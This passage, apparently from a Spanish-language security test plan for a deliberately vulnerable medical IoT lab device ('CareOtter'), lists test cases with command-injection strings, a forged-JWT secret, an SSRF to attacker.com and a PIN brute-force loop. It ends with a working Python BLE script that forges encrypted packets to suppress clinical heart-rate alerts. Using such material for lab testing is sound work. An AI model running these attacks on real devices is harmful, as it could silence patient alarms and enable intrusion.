| IGP-08 | Alert cmd injection | `igp 0x0C "test'; touch /tmp/pwned #"` | Archivo creado en RPi |
| API-01 | Weak JWT secret | Firmar token con `careotter_jwt_2026` | API acepta token forjado |
| API-02 | WiFi raw field | `GET /api/network` con JWT | Campo `.raw` con PSK |
| API-03 | Format string proxy | `GET /api/device/status?module=%x.%x.%x` | Stack leak del careservice |
| API-04 | Flask debug | `curl /console` o trigger traceback | Werkzeug debugger expuesto |
| API-05 | SHA-256 no salt | `echo -n 'CareOtter2026!' \| sha256sum` | Coincide con hash en SQLite |
| API-06 | Role bypass | Token de `patient` en `/api/network` | Paciente accede a datos admin |
| BLE-01 | No pairing | Fake `CareOtter_HR` advertiser | App conecta sin verificar MAC |
| BLE-02 | BLE plaintext | `btsnoop_hci.log` + Wireshark | BPM/SpO₂ en claro |
| BLE-03 | SD card log | `adb shell cat /sdcard/careotter_vitals.log` | Vitales en plaintext |
| BLE-04 | Hidden panel | 5 taps en título o JADX | Panel DIAG visible |
| BLE-05 | Unvalidated write | Escribir JSON malformado en `0xFF01` | Dispositivo acepta sin validar |
| BLE-06 | CSCP key leak | `strings apk \| grep key-16` | `careotter-key-16` expuesta |
| BLE-07 | Alert suppression | `forge_threshold.py` con `(0,255,0)` | Umbrales letales aplicados |
| BLE-08 | Hidden service | `discover_services()` en bleak | UUID `0xFF10` visible |
| BLE-09 | PIN brute force | `for pin in range(10000)` en `0xFF12` | PIN `1234` aceptado |
| BLE-10 | WiFi PSK leak | `read_gatt_char(0xFF11)` | `wifi_psk` en plaintext |
| BLE-11 | BLE shell injection | `wifi_set` con SSID `'; touch /tmp/pwned; #'` | Archivo creado en RPi |
| BLE-12 | SSRF cloud_set | `cloud_set` a `http://attacker.com` | URL maliciosa persistida |
| BLE-13 | Factory reset | `write_gatt_char(0xFF11, factory_reset)` | Config borrada sin confirmación |
| BLE-14 | Channel never expires | Esperar 30 min y repetir BLE-08~13 | Canal sigue activo |

---

## Anexos

### A. Script IGP Helper

Ver [Helpers Comunes](#helpers-comunes).

### B. Script CSCP Threshold Forger

Guardar como `forge_threshold.py`:

```python
import asyncio
import struct
import binascii
from bleak import BleakClient, BleakScanner
from Crypto.Cipher import AES

THRESHOLD_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"
CSCP_KEY       = b"careotter-key-16"
CSCP_MAGIC     = 0xCAFE0DDA


def forge_packet(bpm_min: int, bpm_max: int, spo2_min: int) -> bytes:
    pt  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ct  = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(pt)
    crc = binascii.crc32(ct) & 0xFFFFFFFF
    return struct.pack(">II", CSCP_MAGIC, crc) + ct


async def main():
    device = await BleakScanner.find_device_by_name("CareOtter_HR", timeout=10.0)
    if not device:
        print("[-] Device not found")
        return
    async with BleakClient(device) as c:
        payload = forge_packet(0, 255, 0)   # suppress all clinical alerts
        await c.write_gatt_char(THRESHOLD_UUID, payload)
        print("[+] CSCP v1 lethal thresholds written — alerts suppressed")


if __name__ == "__main__":
    asyncio.run(main())
```

Instalación de dependencias:
```bash
pip install bleak pycryptodome
```

---

## Notas de Ejecución

- **Modo vulnerable:** La mayoría de las pruebas de la API requieren `VULNERABLE=1` (por defecto). Algunas vulnerabilidades (como la omisión del campo `raw` en `/api/network`) desaparecen en `VULNERABLE=0`.
- **Binario careservice:** Si el RPi 3B (aarch64) rechaza el binario ARM 32-bit, compilar nativamente con `gcc careservice.c -o careservice` directamente en el dispositivo.
- **BLE tests:** El RPi 3B con OpenWRT puede carecer de firmware Bluetooth (`BCM43430`). Si `hci0` no está presente, el BLE server no iniciará y las pruebas BLE deberán ejecutarse contra el emulador o un segundo dispositivo con BlueZ.
